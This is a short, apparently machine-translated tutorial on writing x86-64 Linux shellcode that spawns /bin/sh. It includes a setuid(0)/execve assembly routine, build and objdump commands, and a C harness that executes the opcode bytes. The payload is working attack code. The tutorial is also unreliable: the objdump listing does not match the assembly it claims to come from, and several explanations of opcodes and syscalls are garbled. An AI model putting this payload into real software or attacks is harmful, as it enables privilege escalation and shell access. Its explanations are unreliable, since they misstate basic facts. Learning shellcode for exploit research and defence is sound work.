# shellcode
Shellcode is a set of instructions opcode that can be run by the program because shellcode operates directly on registers and functions, so opcode must be hex.


Since it's an attack, shellcode's main purpose is to call system functions, and there are two ways to do that under x86 in Linux.


The first is to break int 0x80 into the kernel state by calling directly to achieve the purpose of the call.


The second is by calling libc for syscall(64 bits) and sysenter(32 bits)


Syscall is currently recommended in 64-bit Linux, as opcode is a 16-bit set of instructions that can be compiled to execute code by first coming out of assembly code, and finally looking at opcode.

shell.c
```
#include <stdio.h>
int main(){
setuid(0);
execve("/bin/sh",NULL,NULL);
}
```
The corresponding assembly code is as follows

```
global _start
 
_start:
 
xor rdi,rdi
xor rax,rax
mov al,0x69
syscall
 
xor rdx, rdx
mov rbx, 0x68732f6e69622fff
shr rbx, 0x8
push rbx
mov rdi, rsp
xor rax, rax
push rax
push rdi
mov rsi, rsp
mov al, 0x3b
syscall
```
This is not a result of disassembly of shell.c

This code is not shellcode that can be executed, but we can get the opcode we need by compiling it into executable files
```
nasm -f elf64 shell.asm   
ld -o shell shell.o
objdump -d shell
```
Note: elf64 is used under 64 bits and elf32 is used under 32 bits


Using objdump results as follows:
```
shell:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080:	6a 3b                	pushq  $0x3b
  400082:	58                   	pop    %rax
  400083:	99                   	cltd   
  400084:	52                   	push   %rdx
  400085:	48 bb 2f 2f 62 69 6e 	movabs $0x68732f6e69622f2f,%rbx
  40008c:	2f 73 68 
  40008f:	53                   	push   %rbx
  400090:	54                   	push   %rsp
  400091:	5f                   	pop    %rdi
  400092:	52                   	push   %rdx
  400093:	57                   	push   %rdi
  400094:	54                   	push   %rsp
  400095:	5e                   	pop    %rsi
  400096:	0f 05                	syscall 
```
```
shellcode.c
#include <stdio.h>
#include <string.h>
char *code = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05";
int main()
{
    printf("len:%d bytes\n", strlen(code));
    (*(void(*)()) code)();
    return 0;
}
```




